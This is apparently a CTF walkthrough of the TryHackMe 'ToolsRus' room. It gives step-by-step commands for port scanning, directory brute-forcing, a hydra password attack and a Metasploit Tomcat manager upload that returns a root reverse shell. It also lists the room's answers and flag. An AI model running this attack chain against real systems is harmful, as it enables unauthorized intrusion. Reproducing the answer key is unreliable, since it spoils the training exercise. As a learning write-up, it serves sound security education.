# ToolsRus Wlakthrough
### Link
- https://tryhackme.com/room/toolsrus
------------------------
### Nmap
- sudo nmap -sC -sV -p- [IP]
- Open port :   
    - 80
    - 1234 --> Apache Tomcat/Coyote JSP engine 1.1
    - 8009 --> Apache Jserv (Protocol v1.3)
- Picture: [ToolsRus_walkthrough_1.png](https://github.com/LNB283/THM/blob/main/EASY/ToolsRus/Pictures/ToolsRus_walkthrough_1.png)
- What other port that serves a webs service is open on the machine?
**Answers**: 1234
- What is the server version (run the scan against port 80)?
**Answer**: Apache/2.4.18
- What version of Apache-Coyote is this service using?
**Answer**: 1.1
------------------------
### Dirbuster
- sudo gobuster dir -u http://[IP]:[Port] -w [path]/wordlists/dirbuster/directory-list-2.3-medium.txt
- What directory can you find, that begins with a "g"?
**Answers**: /guidelines
- Whose name can you find from this directory?
**Answers**: bob
- What directory has basic authentication?
**Answer**: /protected
------------------------
### hydra
- sudo hydra -l bob -P  [path]wordlists/rockyou.txt -f 10.10.248.249 http-get /protected/
- What is bob's password to the protected part of the website?
**Answers**: bubbles
- Going to the service running on that port, what is the name and version of the software?
**Answer**: Apache Tomcat/7.0.88
------------------------
### nikto
- Log to manager with bob credentials
- sudo nikto -h http://10.10.23.90:1234/manager/html/ -id "bob:bubbles"
- How many documentation files did Nikto identify?
**Answer**: 5
------------------------
### Metasploit
- Search exploit for tomcat
    - search type:exploit name:tomcat
- Select exploit/multi/http/tomcat_mgr_upload
    - use exploit/multi/http/tomcat_mgr_upload
- Check settings we need to define
    - show options
- As we can see we have : HttpPasswrod / HttpUsername / RHOSTS / RPORT / LHOSTS
    - set HttpPassword bubbles
    - set HttpUsername bob
    - set RHOSTS [IP]
    - set RPORT 1234
    - set LHOSTS [local IP machine]
        - Let's double check if we indicate all information
- Execute the payload
    - execution
- When the payload is active, type these commands
    - shell
    - id
- What user did you get a shell as?
**Answer**: root
- What text is in the file /root/flag.txt
    - cd root
    - ls
    - cat flag.txt
**Answer**: ff1fc4a81affcc7688cf89ae7dc6e0e1